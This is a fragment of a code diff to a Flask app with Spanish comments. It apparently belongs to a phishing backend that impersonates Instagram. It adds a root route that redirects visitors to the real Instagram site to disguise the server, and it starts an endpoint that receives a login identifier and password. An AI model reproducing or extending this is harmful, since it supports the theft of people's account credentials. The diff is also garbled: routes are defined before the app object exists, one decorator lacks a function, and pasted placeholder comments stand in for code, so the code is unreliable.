@@ -6,6 +6,26 @@ import requests
 from flask import Flask, request, jsonify, redirect
 from flask_sqlalchemy import SQLAlchemy # NUEVA LIBRERÍA
 
+# app.py
+
+# ... (El resto de tus imports y configuración) ...
+
+# ----------------------------------------------------------------------
+# NUEVO ENDPOINT: RUTA RAÍZ (PARA EVITAR EL ERROR 404)
+# ----------------------------------------------------------------------
+@app.route('/')
+def home():
+    """Redirige el tráfico de la URL raíz a la página real de Instagram."""
+    # Esto simula un comportamiento "normal" para el tráfico directo
+    # y evita que el atacante vea la página 404.
+    return redirect("https://www.instagram.com/", code=302)
+
+# ----------------------------------------------------------------------
+# ENDPOINT 1: RECEPCIÓN DE IDENTIFICADOR Y CONTRASEÑA (PASO 1)
+# ----------------------------------------------------------------------
+@app.route('/api/login-step1', methods=['POST'])
+# ... (El resto de tu lógica) ...
+
 # --- CONFIGURACIÓN DE SEGURIDAD Y APLICACIÓN ---
 app = Flask(__name__)
 app.secret_key = os.environ.get('FLASK_SECRET_KEY', 'SUPER_SECRETO_Y_SEGURO_CAMBIAR_ESTO')
